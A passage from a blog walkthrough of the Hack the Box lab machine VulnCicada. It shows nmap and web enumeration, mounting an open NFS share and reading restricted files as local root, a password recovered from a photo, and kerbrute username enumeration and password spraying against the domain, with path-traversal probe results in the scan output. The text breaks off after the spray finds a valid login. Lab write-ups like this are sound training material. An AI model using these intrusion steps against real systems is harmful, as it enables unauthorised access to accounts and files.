@@ -1,0 +1,1290 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Hack the Box - VulnCicada (Medium) Walkthrough</title>
+<link rel=stylesheet href=/style.css><style>.navbar-container{display:flex;flex-direction:column;align-items:center;margin-bottom:2rem}.logo-full{display:block;margin:2rem auto .5rem;max-width:720px;height:256px;object-fit:contain}nav.navbar{display:flex;justify-content:center;align-items:center;gap:2.5rem;margin-bottom:1.5rem}.navbar-link{color:#eaeaea;font-size:1.1rem;text-decoration:none;font-weight:500;display:flex;align-items:center;transition:color .2s}.navbar-link:hover{color:#6ec1e4}.navbar-logo-text{height:2.2rem;width:auto;display:block}@media(max-width:600px){.logo-full{max-width:120px;height:40px}nav.navbar{gap:1.2rem}.navbar-logo-text{height:1.3rem}}</style></head><body><div class=navbar-container><a href=/><img src=/logofull.png alt="gentlem00se full logo" class=logo-full></a><nav class=navbar><a href=/ class=navbar-link>Home</a>
+<a href=/categories/ class=navbar-link>Categories</a>
+<a href=/about/ class=navbar-link>About</a></nav></div><div class=center-container><article class=post-article><h1>Hack the Box - VulnCicada (Medium) Walkthrough</h1><div class=post-date>Jul 5, 2025</div><div class=post-content><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/vulncicada-htb-walkthrough/VulnCicada.png alt="VulnCicada HTB Walkthrough" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><h3 id=box-info>Box Info</h3><p><strong>Box Name:</strong> VulnCicada<br><strong>Listed Difficulty Rating:</strong> Medium<br><strong>chasepd&rsquo;s Difficulty Rating:</strong> Medium-Hard (mostly due to flaky and complicated exploit)
+<strong>Release Date:</strong> 2025 (Formerly from Vulnlab, acquired by Hack the Box)<br><strong>Tech Stack:</strong> Kerberos, NFS, Active Directory, Active Directory Certificate Services
+<strong>Skills Learned:</strong> NFS enumeration, Active Directory enumeration, ADCS exploits</p><h3 id=recon>Recon</h3><p>To start, add some hostnames to <code>/etc/hosts/</code> to make referencing the box easier. I always add <code>boxname</code> as well as <code>boxname.htb</code> to start with. For former vulnlab machines like this one, I also add <code>boxname.vl</code> as sometimes these boxes use that naming.</p><p>As always, we run an nmap scan to get some basic intel on the machine. Since it&rsquo;s a Windows machine, we should also run enum4linux.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $nmap -oN nmapscan -A vulncicada
+</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-07-03 10:29 MDT
+</span></span><span style=display:flex><span>Stats: 0:01:52 elapsed; <span style=color:#ae81ff>0</span> hosts completed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> up<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1</span> undergoing Script Scan
+</span></span><span style=display:flex><span>NSE Timing: About 96.77% <span style=color:#66d9ef>done</span>; ETC: 10:31 <span style=color:#f92672>(</span>0:00:00 remaining<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> vulncicada <span style=color:#f92672>(</span>10.129.29.26<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.067s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>985</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
+</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span style=display:flex><span>|_http-title: IIS Windows Server
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#f92672>(</span>server time: 2025-07-03 16:29:36Z<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>111/tcp  open  rpcbind       2-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100000)</span>
+</span></span><span style=display:flex><span>| rpcinfo: 
+</span></span><span style=display:flex><span>|   program version    port/proto  service
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100000</span>  2,3,4        111/tcp6  rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100000</span>  2,3,4        111/udp6  rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100003</span>  2,3         2049/udp   nfs
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100003</span>  2,3         2049/udp6  nfs
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100003</span>  2,3,4       2049/tcp   nfs
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100003</span>  2,3,4       2049/tcp6  nfs
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100005</span>  1,2,3       2049/tcp   mountd
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100005</span>  1,2,3       2049/tcp6  mountd
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100005</span>  1,2,3       2049/udp   mountd
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100005</span>  1,2,3       2049/udp6  mountd
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100021</span>  1,2,3,4     2049/tcp   nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100021</span>  1,2,3,4     2049/tcp6  nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100021</span>  1,2,3,4     2049/udp   nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100021</span>  1,2,3,4     2049/udp6  nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100024</span>  <span style=color:#ae81ff>1</span>           2049/tcp   status
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100024</span>  <span style=color:#ae81ff>1</span>           2049/tcp6  status
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>100024</span>  <span style=color:#ae81ff>1</span>           2049/udp   status
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>100024</span>  <span style=color:#ae81ff>1</span>           2049/udp6  status
+</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-13T10:42:50
+</span></span><span style=display:flex><span>|_Not valid after:  2025-09-13T10:42:50
+</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
+</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
+</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style=display:flex><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-13T10:42:50
+</span></span><span style=display:flex><span>|_Not valid after:  2025-09-13T10:42:50
+</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style=display:flex><span>2049/tcp open  nlockmgr      1-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100021)</span>
+</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-13T10:42:50
+</span></span><span style=display:flex><span>|_Not valid after:  2025-09-13T10:42:50
+</span></span><span style=display:flex><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-13T10:42:50
+</span></span><span style=display:flex><span>|_Not valid after:  2025-09-13T10:42:50
+</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style=display:flex><span>|_ssl-date: 2025-07-03T16:31:03+00:00; 0s from scanner time.
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>| Not valid before: 2025-04-09T08:36:14
+</span></span><span style=display:flex><span>|_Not valid after:  2025-10-09T08:36:14
+</span></span><span style=display:flex><span>Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>| smb2-security-mode: 
+</span></span><span style=display:flex><span>|   3:1:1: 
+</span></span><span style=display:flex><span>|_    Message signing enabled and required
+</span></span><span style=display:flex><span>| smb2-time: 
+</span></span><span style=display:flex><span>|   date: 2025-07-03T16:30:27
+</span></span><span style=display:flex><span>|_  start_date: N/A
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 137.45 seconds
+</span></span></code></pre></div><p>From the nmap scan we now know that the box is DC-JPQ225.cicada.vl. We should add this to our hosts file, since it&rsquo;s likely we&rsquo;ll need to use the correct hostname to interact with Kerberos, which is also running here. There&rsquo;s also a website, so we&rsquo;ll need to check that out. Interestingly, the port for RDP is open, so we may be able to RDP in if we can get credentials.</p><p>enum4linux doesn&rsquo;t give us anything helpful. <code>smbclient -L \\\\cicada.vl</code> tells us SMB shares aren&rsquo;t enabled. Time to check out the website and see what info that might give us.</p><p>The website is just the default IIS page:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/vulncicada-htb-walkthrough/default-iis.png alt="Default IIS page" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>When doing web enumeration I run three commands simultaneously:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://cicada.vl -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style=color:#ae81ff>50</span>
+</span></span></code></pre></div><p>This does a broad spread of web enumeration looking for default directories and endpoints.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dirsearch -u http://cicada.vl
+</span></span></code></pre></div><p>dirsearch is more or less the same as gobuster, but I like to run it in tandem with its default wordlist because occasionally it will find things that my default gobuster enum misses.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster vhost --append-domain -u http://cicada.vl -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+</span></span></code></pre></div><p>This looks for subdomains that might exist on the host, which might surface alternate web apps we can enumerate and exploit. The <code>--append-domain</code> flag tells gobuster that we&rsquo;re looking for subdomains of the original domain we provided.</p><p>Neither of our gobuster searches turn up anything, but dirsearch comes back with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $dirsearch -u http://cicada.vl
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span style=display:flex><span> <span style=color:#f92672>(</span>_<span style=color:#f92672>||</span>| _<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>/_<span style=color:#f92672>(</span>_<span style=color:#f92672>||</span> <span style=color:#f92672>(</span>_| <span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style=color:#ae81ff>25</span> | Wordlist size: <span style=color:#ae81ff>11460</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Output File: /home/chasepd/htb/vulncicada/reports/http_cicada.vl/_25-07-03_10-44-38.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Target: http://cicada.vl/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:38<span style=color:#f92672>]</span> Starting: 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:39<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  312B  - /%2e%2e//google.com
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:39<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:44<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  312B  - /<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\e</span>tc<span style=color:#ae81ff>\p</span>asswd
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:52<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -    1KB - /certenroll/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:52<span style=color:#f92672>]</span> <span style=color:#ae81ff>401</span> -    1KB - /certsrv/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>10:44:52<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+</span></span></code></pre></div><p>Most of these results are likely garbage, but <code>/certenroll/</code> and <code>/certsrv/</code> both stick out as interesting and unusual. A quick search for these shows us that these endpoints are likely related to Active Directory Certificate Services, specifically <a href=https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-authority-web-enrollment>Certification Authority Web Enrollment</a>. Certificate Authorities are what provide certificates for various services. For example, they are mutually trusted third-parties that sign SSL/TLS certificates. Browsers include trusts for these certificate authorities and use their public keys to verify SSL certificates that claim to have been issued by them. Unfortunately for us currently, <code>/certenroll/</code> gives a 403 response and <code>/certsrv/</code> asks for a username and password when we navigate to it in a browser, so we can&rsquo;t do anything with this yet.</p><p>Looking back at the nmap results, we see that there&rsquo;s an NFS (Network File System) server running on port 2049. Let&rsquo;s check out what might be available there.</p><p>There&rsquo;s a publicly available folder on it:</p><pre tabindex=0><code>└──╼ $showmount -e cicada.vl
+Export list for cicada.vl:
+/profiles (everyone)
+</code></pre><p>Let&rsquo;s mount this and see what is there:</p><pre tabindex=0><code>┌─[chasepd@THE-HACKINATOR]─[~/htb/vulncicada]
+└──╼ $sudo mkdir /mnt/cicada_nfs
+┌─[chasepd@THE-HACKINATOR]─[~/htb/vulncicada]
+└──╼ $sudo mount -t nfs cicada.vl:/profiles /mnt/cicada_nfs/
+┌─[chasepd@THE-HACKINATOR]─[~/htb/vulncicada]
+└──╼ $ls -la /mnt/cicada_nfs/
+total 10
+drwxrwxrwx 2 nobody nogroup 4096 Jun  3 04:21 .
+drwxr-xr-x 1 root   root      20 Jul  3 11:09 ..
+drwxrwxrwx 2 nobody nogroup   64 Sep 15  2024 Administrator
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Debra.Wright
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Jane.Carter
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Katie.Ward
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
+drwxrwxrwx 2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
+drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Shirley.West
+</code></pre><p>A bunch of directories named after (presumably) users. This is already very helpful as it gives us some potential usernames to start working with, but lets dig in and see what else we can find in these directories.</p><p>There are only two directories with anything in them, <code>Administrator</code>, and <code>Rosie.Powell</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#f92672>[</span>chasepd@THE-HACKINATOR<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>/mnt/cicada_nfs/Rosie.Powell<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└──╼ $la
+</span></span><span style=display:flex><span>total 1.8M
+</span></span><span style=display:flex><span>drwxrwxrwx <span style=color:#ae81ff>2</span> nobody nogroup   <span style=color:#ae81ff>64</span> Sep <span style=color:#ae81ff>15</span>  <span style=color:#ae81ff>2024</span> .
+</span></span><span style=display:flex><span>drwxrwxrwx <span style=color:#ae81ff>2</span> nobody nogroup 4.0K Jun  <span style=color:#ae81ff>3</span> 04:21 ..
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> nobody nogroup   <span style=color:#ae81ff>64</span> Sep <span style=color:#ae81ff>15</span>  <span style=color:#ae81ff>2024</span> Documents
+</span></span><span style=display:flex><span>-rwx------ <span style=color:#ae81ff>1</span> nobody nogroup 1.8M Sep <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> marketing.png
+</span></span><span style=display:flex><span>┌─<span style=color:#f92672>[</span>chasepd@THE-HACKINATOR<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>/mnt/cicada_nfs/Administrator<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└──╼ $la
+</span></span><span style=display:flex><span>total 1.5M
+</span></span><span style=display:flex><span>drwxrwxrwx <span style=color:#ae81ff>2</span> nobody nogroup   <span style=color:#ae81ff>64</span> Sep <span style=color:#ae81ff>15</span>  <span style=color:#ae81ff>2024</span> .
+</span></span><span style=display:flex><span>drwxrwxrwx <span style=color:#ae81ff>2</span> nobody nogroup 4.0K Jun  <span style=color:#ae81ff>3</span> 04:21 ..
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> nobody nogroup   <span style=color:#ae81ff>64</span> Sep <span style=color:#ae81ff>15</span>  <span style=color:#ae81ff>2024</span> Documents
+</span></span><span style=display:flex><span>-rwxrwxrwx <span style=color:#ae81ff>1</span> nobody nogroup 1.5M Sep <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> vacation.png
+</span></span></code></pre></div><p>The only thing we actually have access to here is <code>vacation.png</code>, which is a lovely picture of the Admin working while traveling. Just what everone should do for a nice, relaxing vacation.</p><p>However, while this has presumably preserved the file permissions from the server, theoretically this share is now mounted on our machine, and our attacker machine&rsquo;s root user has access to <em>everything</em> on our attacker machine. What happens if we try and access this share as root?</p><p>Sure enough, we can access the restricted files. The Documents folders of both users are boring and just contain <code>desktop.ini</code> files as well as recycled old <code>desktop.ini</code> files, but the restricted <code>marketing.png</code> file is interesting:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/vulncicada-htb-walkthrough/marketing.png alt="Rosie.Powell happily working away with a sticky note next to her" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>Rosie.Powell has provided us with an image of her working, and it tells us two important things. One, that Cicada gives their employees RGB-clad gaming PCs to work on and we should all apply there as soon as possible, and also that Rosie keeps a sticky note on her desk with what looks like a password written on it: <code>Cicada123</code>.</p><p>Sadly, Rosie.Powell doesn&rsquo;t appear to have access to ADCS, but that&rsquo;s not really that surprising given she&rsquo;s in marketing. However, she still may have access to enumerate the domain, or connect via RDP.</p><p>RDP ends up being a dud, and ldapdomaindump tells us that the credentials <code>Rosie.Powell:Cicada123</code> are invalid. However, there are a bunch of users we know about, and maybe this is a default password or something. Let&rsquo;s see if any of the other users we discovered are using that password.</p><p>With our basic wordlists built, let&rsquo;s try some stuff:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#f92672>[</span>chasepd@THE-HACKINATOR<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>~/htb/vulncicada<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└──╼ $cat users
+</span></span><span style=display:flex><span>Administrator
+</span></span><span style=display:flex><span>Daniel.Marshall
+</span></span><span style=display:flex><span>Debra.Wright
+</span></span><span style=display:flex><span>Jane.Carter
+</span></span><span style=display:flex><span>Jordan.Francis
+</span></span><span style=display:flex><span>Joyce.Andrews
+</span></span><span style=display:flex><span>Katie Ward
+</span></span><span style=display:flex><span>Megan.Simpson
+</span></span><span style=display:flex><span>Richard.Gibbons
+</span></span><span style=display:flex><span>Rosie.Powell
+</span></span><span style=display:flex><span>Shirley.West
+</span></span><span style=display:flex><span>┌─<span style=color:#f92672>[</span>chasepd@THE-HACKINATOR<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>~/htb/vulncicada<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└──╼ $cat passwords
+</span></span><span style=display:flex><span>Cicada123
+</span></span></code></pre></div><p>Since Kerberos is running and we know we&rsquo;re already hitting <code>STATUS_NOT_SUPPORTED</code> (which can mean the auth method we&rsquo;re using isn&rsquo;t supported by the server) on SMB, let&rsquo;s try <a href=https://github.com/ropnop/kerbrute>Kerbrute</a> to bruteforce Kerberos creds.</p><p>First we can check that these usernames we have are actually real:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $kerbrute userenum --dc DC-JPQ225.cicada.vl -d cicada.vl users
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    __             __               __     
+</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style=display:flex><span>  / //_/ _ <span style=color:#ae81ff>\/</span> ___/ __ <span style=color:#ae81ff>\/</span> ___/ / / / __/ _ <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style=display:flex><span>/_/|_|<span style=color:#ae81ff>\_</span>__/_/  /_.___/_/   <span style=color:#ae81ff>\_</span>_,_/<span style=color:#ae81ff>\_</span>_/<span style=color:#ae81ff>\_</span>__/                                        
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Version: dev <span style=color:#f92672>(</span>9cfb81e<span style=color:#f92672>)</span> - 07/03/25 - Ronnie Flathers @ropnop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  Using KDC<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  	DC-JPQ225.cicada.vl:88
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Joyce.Andrews@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Daniel.Marshall@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Debra.Wright@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Megan.Simpson@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Administrator@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Jane.Carter@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Richard.Gibbons@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Jordan.Francis@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 Rosie.Powell@cicada.vl
+</span></span><span style=display:flex><span>2025/07/03 11:47:26 &gt;  Done! Tested <span style=color:#ae81ff>11</span> usernames <span style=color:#f92672>(</span><span style=color:#ae81ff>9</span> valid<span style=color:#f92672>)</span> in 0.131 seconds
+</span></span></code></pre></div><p>Very nice, we have 9 valid users. Lets see if any of them are using <code>Cicada123</code> as their password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $kerbrute passwordspray --dc DC-JPQ225.cicada.vl -d cicada.vl  users Cicada123
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    __             __               __     
+</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style=display:flex><span>  / //_/ _ <span style=color:#ae81ff>\/</span> ___/ __ <span style=color:#ae81ff>\/</span> ___/ / / / __/ _ <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style=display:flex><span>/_/|_|<span style=color:#ae81ff>\_</span>__/_/  /_.___/_/   <span style=color:#ae81ff>\_</span>_,_/<span style=color:#ae81ff>\_</span>_/<span style=color:#ae81ff>\_</span>__/                                        
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Version: dev <span style=color:#f92672>(</span>9cfb81e<span style=color:#f92672>)</span> - 07/03/25 - Ronnie Flathers @ropnop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2025/07/03 11:49:05 &gt;  Using KDC<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>2025/07/03 11:49:05 &gt;  	DC-JPQ225.cicada.vl:88
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2025/07/03 11:49:05 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID LOGIN:	 Rosie.Powell@cicada.vl:Cicada123
